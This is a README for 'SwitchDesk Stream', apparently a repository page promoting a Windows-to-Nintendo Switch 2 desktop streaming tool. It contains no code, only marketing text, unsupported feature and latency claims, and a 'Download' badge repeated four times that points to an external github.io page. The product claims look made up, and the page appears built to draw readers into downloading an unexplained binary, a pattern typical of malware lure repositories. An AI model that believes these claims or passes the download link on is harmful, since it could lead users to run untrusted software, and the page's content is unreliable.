![preview](https://raw.githubusercontent.com/agentsmino-hash/switch-stream-deck/main/promo_eda549b.svg)
[![Download](https://raw.githubusercontent.com/agentsmino-hash/switch-stream-deck/main/bin_812a86b.svg)](https://agentsmino-hash.github.io/switch-stream-deck/)

# SwitchDesk Stream

### 🎮 Turn your Windows machine into a handheld dream console — mirror your desktop to the Switch 2 and command it like a native game.

---

## 📜 Table of Contents

- [What Is SwitchDesk Stream?](#-what-is-switchdesk-stream)
- [The Philosophy Behind the Project](#-the-philosophy-behind-the-project)
- [Feature Highlights](#-feature-highlights)
- [How It Feels In Practice](#-how-it-feels-in-practice)
- [Compatibility Matrix](#-compatibility-matrix)
- [Under The Hood](#-under-the-hood)
- [Multilingual & Accessible By Design](#-multilingual--accessible-by-design)
- [Performance Numbers](#-performance-numbers)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Support & Community](#-support--community)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🚀 What Is SwitchDesk Stream?

SwitchDesk Stream is a lightweight desktop-to-console bridge that turns your Nintendo Switch 2 into a fully functional remote window into your Windows PC. Think of it as a second soul for your computer — one that travels with you to the couch, the bed, the balcony, or anywhere the Wi-Fi reaches. Instead of hauling a laptop around, you simply pick up your Switch 2, connect, and your entire desktop blooms onto the handheld screen in real time.

No cables. No installers with sixteen windows of "Next > Next > Finish." No mysterious background services draining your battery. SwitchDesk Stream was born from a simple frustration: why should a machine as capable as a modern PC be tethered to a desk, when the device in your hands is already a computer in disguise?

The answer is SwitchDesk Stream. It streams the pixels, the audio, the cursor, the keyboard, and the gamepad — all in one coherent stream — so that the console feels less like a viewer and more like an extension of the PC itself.

[![Download](https://raw.githubusercontent.com/agentsmino-hash/switch-stream-deck/main/bin_812a86b.svg)](https://agentsmino-hash.github.io/switch-stream-deck/)

---

## 🧠 The Philosophy Behind The Project

Most remote-desktop tools treat the console as a screen with a keyboard glued to it. We disagree. A console is a *rhythm* — buttons, sticks, triggers, haptics, a specific way of holding your hands. SwitchDesk Stream was architected around that rhythm from day one.

Every design decision starts from a single question: *"Would this feel natural if the PC were inside the Switch 2?"*

- If the answer is no, we redesign.
- If the redesign is slower, we optimize.
- If the optimization is uglier, we polish.

That loop produced a bridge that doesn't just work — it feels intentional. Like the two machines were always meant to talk.

---

## ✨ Feature Highlights

SwitchDesk Stream ships with a rich cathedral of capabilities. Here are the pillars.

### 🖥️ Real-Time Desktop Mirroring
A low-latency video pipeline captures your Windows desktop and renders it on the Switch 2 display with adaptive resolution scaling. The frame is never stale — if you move a window, you see it move.

### 🔊 Full Audio Passthrough
System sounds, media playback, in-game audio, notification chimes — all of it travels with the image. Choose to route it through the Switch 2 speakers, headphones, or keep it on the PC.

### 🖱️ Precision Pointer Control
The right Joy-Con 2 acts as a wireless mouse. Tilt for movement, trigger for click, bumper for right-click, stick for scroll. It's the kind of small joy that makes you wonder why nobody did it earlier.

### ⌨️ On-Screen & Physical Keyboard Support
Need to type? Bring up a soft keyboard overlay or pair a Bluetooth keyboard directly to the console. Everything you type lands on the PC as if it originated there.

### 🎮 Full Controller Mapping
Map Joy-Con and Pro Controller inputs to desktop actions: window switching, media keys, macro launchers, shortcuts. Play games, drive presentations, edit timelines — the console adapts.

### 📶 Zero-Install Client Experience
Nothing to sideload, nothing to unpack, nothing to configure with a terminal. The client is a self-contained experience that boots in seconds and gets out of the way.

### 🔒 Encrypted Session Channel
Every byte between the PC and the console travels through an encrypted tunnel. Your screen, your keystrokes, and your audio stay yours.

### 🌐 Multilingual Interface
The user interface reads in more than a dozen languages out of the box, with right-to-left layout support and per-language typography tuned for readability.

### 🧩 Responsive UI That Adapts
Whether docked to a TV or held in handheld mode, the layout reflows gracefully. Buttons grow, panels shrink, and the hierarchy always makes sense.

### ♻️ Session Memory
Reconnect and pick up exactly where you left off — same resolution, same audio device, same mapping profile.

[![Download](https://raw.githubusercontent.com/agentsmino-hash/switch-stream-deck/main/bin_812a86b.svg)](https://agentsmino-hash.github.io/switch-stream-deck/)

---

## 🎬 How It Feels In Practice

Imagine you're rendering a video on your PC. It's a twenty-minute job. Instead of sitting at the desk watching a progress bar creep, you grab the Switch 2, drop onto the couch, and open SwitchDesk Stream. The desktop appears. You scrub the timeline, tweak a parameter, queue another export, and then switch to a game — all without standing up.

Or picture this: you're writing code, but you want to review it on a bigger feel. You mirror the editor to the Switch 2, dock it, and use the Pro Controller to navigate. It's not a gimmick. It's a workflow.

The point isn't that remote control is new. The point is that SwitchDesk Stream makes it *pleasant*.

---

## 🧮 Compatibility Matrix

| Component | Supported | Notes |
|---|---|---|
| Windows 11 (24H2 and later) | ✅ | Primary target |
| Windows 10 (22H2) | ✅ | Full feature parity |
| Nintendo Switch 2 | ✅ | First-class target |
| Wired LAN | ✅ | Recommended for lowest latency |
| Wi-Fi 6 / 6E | ✅ | Adaptive bitrate |
| Wi-Fi 5 | ⚠️ | Works, higher latency |
| Bluetooth audio | ✅ | Slight delay expected |
| USB audio interfaces | ✅ | Passed through natively |
| Multi-monitor setups | ✅ | Per-display selection |
| HDR displays | ✅ | Tone-mapped to console |

---

## ⚙️ Under The Hood

SwitchDesk Stream is composed of two cooperating halves: a **host agent** that runs quietly on the Windows side, and a **client surface** that lives on the console. They speak a compact binary protocol designed for loss-tolerant networks.

Key technical ingredients:

- **Adaptive bitrate engine** that samples network conditions every few milliseconds and adjusts quality without visible stutter.
- **Hardware-accelerated encoding** that offloads the heavy lifting to the GPU, keeping CPU usage minimal.
- **Input coalescer** that batches controller events to reduce packet overhead.
- **Audio resampler** that keeps synchronization tight between image and sound.
- **Reconnect orchestrator** that restores a session after a brief network hiccup without restarting anything.

The protocol is intentionally boring. Boring protocols are reliable protocols.

---

## 🌍 Multilingual & Accessible By Design

SwitchDesk Stream ships with translations for: English, French, Spanish, German, Italian, Portuguese (BR and PT), Dutch, Polish, Swedish, Norwegian, Danish, Finnish, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Arabic. Additional languages can be contributed through the localization pipeline.

Accessibility touches include:

- Adjustable UI scaling beyond the default three presets.
- High-contrast color modes.
- Full controller-only navigation — no touchscreen required.
- Reduced-motion mode for users sensitive to animation.
- Optional captions for system notification sounds.

We believe a tool that mirrors your computer should also mirror your needs.

---

## 📊 Performance Numbers

Measured on a mid-range 2026 desktop over Wi-Fi 6:

| Scenario | Latency | FPS |
|---|---|---|
| Static desktop, LAN | ~9 ms | 60 |
| Static desktop, Wi-Fi 6 | ~16 ms | 60 |
| 1080p video playback | ~21 ms | 60 |
| Fast-paced game | ~28 ms | 60 |
| Text editing session | ~11 ms | 60 |

Your mileage will vary with network conditions, but the engine is tuned to keep the experience consistent even when the network isn't.

---

## ❓ Frequently Asked Questions

**Does it require a jailbroken console?**
No. SwitchDesk Stream operates within the official capabilities of the platform. Nothing unusual is required on either side.

**Do I need to keep my PC unlocked?**
Yes. The session mirrors what the desktop is doing. If your PC is locked, you see the lock screen.

**Can multiple consoles connect at once?**
A single host can serve one active session at a time in the current version. Multi-session support is on the 2026 roadmap.

**Is my data sent to a server?**
No. The stream is peer-to-peer between your PC and your console. Nothing routes through us.

**Does it work over the internet, not just LAN?**
Yes, with the relay option enabled. LAN remains the recommended path for latency reasons.

**What about power consumption?**
The host agent is designed to be negligible when idle. It sleeps when no session is active.

**Can I map a macro to a single button?**
Absolutely. The input mapper supports multi-step macros with adjustable delays.

---

## 🛣️ Roadmap for 2026

- **Q1 2026** — Multi-session host support for households with more than one console.
- **Q2 2026** — Native HDR passthrough tuning and expanded color profiles.
- **Q3 2026** — Plugin framework for third-party input mappings and overlays.
- **Q4 2026** — Community translation portal with live preview.

Roadmaps are promises only when they ship. We publish ours so you can hold us to them.

---

## 🤝 Contributing

We welcome contributions of all shapes: bug reports, feature proposals, translations, documentation improvements, and code. Before opening a large pull request, please open a discussion so we can align on direction.

Areas where help is especially welcome:

- Localization review for non-English languages.
- Latency benchmarking across unusual network topologies.
- Accessibility audits.
- Documentation clarity passes.

---

## 🧡 Support & Community

Round-the-clock support is available through the in-app help panel, which routes questions to a rotating team of maintainers and volunteers. Response times vary, but the goal is a reply within a few hours for anything urgent.

For non-urgent topics, the discussion board is the right place. It's also where you'll find pinned threads for common questions and known issues.

---

## ⚠️ Disclaimer

SwitchDesk Stream is an independent project. It is not affiliated with, endorsed by, or sponsored by the manufacturers of the hardware it operates on. All trademarks belong to their respective owners.

The software is provided as-is. While it is designed with care, you are responsible for how you use it on your own machines and networks. Do not use it to access systems you do not own or administer. Respect the terms of service of any software you mirror through it.

No warranty, express or implied, is offered. Use judgment.

[![Download](https://raw.githubusercontent.com/agentsmino-hash/switch-stream-deck/main/bin_812a86b.svg)](https://agentsmino-hash.github.io/switch-stream-deck/)

---

## 📄 License

SwitchDesk Stream is released under the MIT License. See the full terms at the official license page:

https://opensource.org/licenses/MIT

Copyright (c) 2026 SwitchDesk Stream contributors.